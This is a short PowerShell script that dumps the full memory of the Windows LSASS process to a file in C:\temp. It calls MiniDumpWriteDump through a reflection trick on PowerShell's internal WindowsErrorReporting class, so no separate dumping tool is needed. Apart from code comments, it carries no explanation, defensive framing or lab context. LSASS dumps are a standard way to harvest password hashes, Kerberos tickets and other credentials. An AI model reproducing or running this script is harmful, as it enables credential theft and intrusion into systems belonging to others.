# Define the output directory
$S = "C:\temp"

# Ensure the directory exists
if (!(Test-Path -Path $S)) {
    New-Item -ItemType Directory -Path $S | Out-Null
}

# Get the LSASS process
$P = Get-Process lsass

# Load Windows Error Reporting API
$A = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')
$B = $A.GetNestedType('NativeMethods', 'NonPublic')
$C = [Reflection.BindingFlags] 'NonPublic, Static'

# Get MiniDumpWriteDump method
$D = $B.GetMethod('MiniDumpWriteDump', $C)

# Define dump file path
$PF = "$($P.Name)_$($P.Id).dmp"
$PDP = Join-Path -Path $S -ChildPath $PF

# Open file stream for the dump
$F = New-Object IO.FileStream($PDP, [IO.FileMode]::Create)

# Define the dump type (2 = MiniDumpWithFullMemory)
$DumpType = [UInt32] 2

# Call the MiniDumpWriteDump function
$Result = $D.Invoke($null, @($P.Handle, 0, $F.SafeFileHandle, $DumpType, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero))

# Close the file stream
$F.Close()

# Check for success
if ($Result) {
    Write-Output "Dump successfully created: $PDP"
} else {
    Write-Output "Failed to create dump."
}
